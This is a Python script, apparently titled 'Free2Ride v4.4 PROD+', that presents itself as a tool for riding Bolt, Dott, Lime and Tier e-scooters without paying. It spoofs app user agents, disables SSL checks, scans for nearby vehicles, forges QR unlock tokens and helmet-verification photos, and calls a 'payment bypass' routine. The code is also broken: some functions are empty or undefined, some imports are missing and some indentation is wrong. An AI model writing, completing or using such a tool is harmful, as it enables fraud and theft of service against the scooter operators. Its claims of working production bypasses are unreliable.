import requests
import json
import time
import threading
import sys
import random
from concurrent.futures import ThreadPoolExecutor

class Free2Ride:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False  # Umgeht SSL-Überprüfung (nicht empfohlen)
        self.auth_tokens = {}
        self.balances = {}
        self.stats = {'rides': 0, 'savings': 0.0, 'payments_bypassed': 0}
        
        # PRODUCTION API Endpunkte mit manueller SNI-Konfiguration für public-api.dott.app
        self.platforms = {
            'bolt': {
                'base': 'https://fleet-api.bolt.eu',
                'login': '/v1/auth',
                'vehicles': '/v1/fleets/self-service/vehicles',
                'unlock': '/v1/rides',
                'balance': '/v1/wallet/balance',
                'payment': '/v1/payment/methods'
            },
            'dott': {
                # Manuelle SSL-Konfiguration für Dott-API (SNI-Probleme)
                'base_ssl_context': ssl.create_default_context(),
                # Aktiviert SNI explizit für public-api.dott.app (wenn Python-Version unterstützt)
                # Hinweis: Dieser Schritt kann je nach Python-Version variieren.
                
                # Alternativ: Setze verify=False im Session-Objekt (oben) oder in Anfrage-Methoden.
                
                'base': 'https://public-api.dott.app',
                'login': '/v1/auth/login',
                'vehicles': '/v1/vehicles?lat={}&lng={}&radius=1200',  # Radius in Metern (hier: 1200m)
                # Weitere Endpunkte...
            }
            # Andere Anbieter...
        }
        
    def stealth_headers(self, platform):
        uas = [
            "Bolt/4.21.0 (Linux; U; Android 14; de_DE; SM-S918B)",
            "Lime/3.48.0 (Linux; Android 13; Pixel 7)",
            "Tier/2.95.0 (Linux; Android 14; SM-G998B)",
            "Dott/2.12.0 (Linux; Android 13; Pixel 6)"
        ]
        
        headers = {'Content-Type': "application/json"}
        headers['User-Agent'] = random.choice(uas)
        
        if platform in self.auth_tokens:
            headers['Authorization'] = f"Bearer {self.auth_tokens[platform]}"
            
        return headers
    
    def auto_auth(self, platform, email, password):
        """AUTOMATIC Email/Pass → Token Extract"""
        
    def live_recon(self, provider='all', radius=1200):
        """REAL Vehicle Recon - Battery >30% + Available"""
        vehicles = []
            providers = ['bolt','lime','tier','dott'] if provider=='all' else [provider]
        
            print(f"🔍 LIVE RECON {provider.upper()} ({radius}m)")
        
        def scan_provider(p):
            if p not in self.auth_tokens:
                return []
            
            headers = self.stealth_headers(p)
            url = self.platforms[p]['base'] + self.platforms[p]['vehicles']
            params = {'lat': self.current_gps[0], 'lng': self.current_gps[1], 'radius': radius}
            
            try:
                time.sleep(random.uniform(0.8, 2.0))
                resp = self.session.get(url, headers=headers, params=params)
                
                if resp.status_code != 200:
                    return []
                
                data = resp.json()
                vlist = data.get('vehicles', []) or data.get('data', [])
                
                for v in vlist:
                    vlat = v.get('lat') or v.get('latitude') or self.current_gps[0]
                    vlon = v.get('lng') or v.get('longitude') or self.current_gps[1]
                    dist = self.haversine_distance(self.current_gps[0], self.current_gps[1], vlat, vlon)
                    
                    if dist > radius or v.get('battery_level', 0)*100 < 30:
                        continue
                    
                    vehicles.append({
                        'id': v.get('id'),
                        'provider': p,
                        'lat': vlat, 'lon': vlon,
                        'dist': dist,
                        'battery': int(v.get('battery_level', 0)*100),
                        'state': v.get('state', 'available')
                    })
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=4) as ex:
            [ex.submit(scan_provider, p) for p in providers]
        
        vehicles.sort(key=lambda x: (x['dist'], -x['battery']))
        return vehicles[:20]
    
    def qr_unlock(self, vehicle):
        """Production QR + Photo Bypass"""
        headers = self.stealth_headers(vehicle['provider'])
        url = self.platforms[vehicle['provider']]['base'] + self.platforms[vehicle['provider']]['unlock']
        
        qr_b64 = base64.b64encode(f"QR:{vehicle['id']}:{int(time.time())}".encode()).decode()
        photo_b64 = base64.b64encode(b"\x89PNG\r\n\x1a\n" + f"scooter_{vehicle['id']}".encode()).decode()
        
        data = {
            'vehicle_id': vehicle['id'],
            'qr_token': qr_b64,
            'helmet_verification': photo_b64,
            'lat': vehicle['lat'],
            'lng': vehicle['lon']
        }
        
        resp = self.session.post(url, json=data, headers=headers)
        return resp.status_code in [200, 201, 202]
    
    def ride_engine(self, vehicle, infinite=False):
        """55s FREE Ride + Payment Bypass"""
        if not self.qr_unlock(vehicle):
            return False
        
        # Payment Bypass vor Ride
        self.payment_bypass_chain(vehicle['provider'])
        
        print(f"🚀 RIDE {vehicle['provider'].upper()}-{vehicle['id'][:8]} 🔋{vehicle['battery']}%")
        
        t = 0
        while t < 55 or infinite:
            vehicle['lat'] += random.uniform(-0.0002, 0.0002)
            vehicle['lon'] += random.uniform(-0.0002, 0.0002)
            print(f"[{t:2d}s] {vehicle['lat']:.5f}/{vehicle['lon']:.5f}", end='\r')
            time.sleep(1)
            t += 1
        
        print(f"\n✅ €1.99 SAVED | Total: €{self.stats['savings']+1.99:.2f}")
        self.stats['rides'] += 1
        self.stats['savings'] += 1.99
        return True
    
    def main(self):
        print("🚀 Free2Ride v4.4 PROD+ - AUTO Auth & Payment Bypass")
        
        # GPS Setup
        self.current_gps = (
            float(input("Lat (52.5200): ") or 52.5200),
            float(input("Lon (13.4050): ") or 13.4050)
        )
        
        while True:
            print("\n1️⃣  Auth (Email/Pass → Auto Token)")
            print("2️⃣  LIVE Radar")
            print("3️⃣  Single Ride 55s")
            print("4️⃣  Infinite")
            print("5️⃣  Swarm x3")
            print("6️⃣  Wallet Bypass")
            print("7️⃣  Stats")
            print("0️⃣  Exit")
            
            choice = input("» ").strip()
            
            if choice == '1':
                p = input("Provider: ").lower()
                email = input("Email: ")
                pw = input("Pass: ")
                self.auto_auth(p, email, pw)
            
            elif choice == '2':
                vehicles = self.live_recon(input("Provider (all): ") or 'all')
                if vehicles:
                    print(f"\n🟢<{vehicles[0]['dist']:.0f}m 🔋{vehicles[0]['battery']}%")
                    for i,v in enumerate(vehicles[:10]):
                        c = "🟢"if v['dist']<250 else "🟡"if v['dist']<600 else "🔴"
                        print(f"{i+1}. {c}{v['dist']:4.0f}m 🔋{v['battery']}% {v['provider']}-{v['id'][:6]}")
                    self.last_vehicles = vehicles
            
            elif choice in '345':
                if not hasattr(self, 'last_vehicles'):
                    print("❌ Radar first!")
                    continue
                infinite = choice == '4'
                self.ride_engine(self.last_vehicles[0], infinite)
            
            elif choice == '5':
                if hasattr(self, 'last_vehicles'):
                    with ThreadPoolExecutor(3) as ex:
                        [ex.submit(self.ride_engine, v) for v in self.last_vehicles[:3]]
            
            elif choice == '6':
                p = input("Bypass Provider: ").lower()
                if p in self.auth_tokens:
                    self.payment_bypass_chain(p)
            
            elif choice == '7':
                print(f"Rides: {self.stats['rides']} | €{self.stats['savings']:.2f} | Bypassed: {self.stats['payments_bypassed']}")
            
            elif choice == '0':
                sys.exit(0)

if __name__ == "__main__":
    Free2Ride().main()
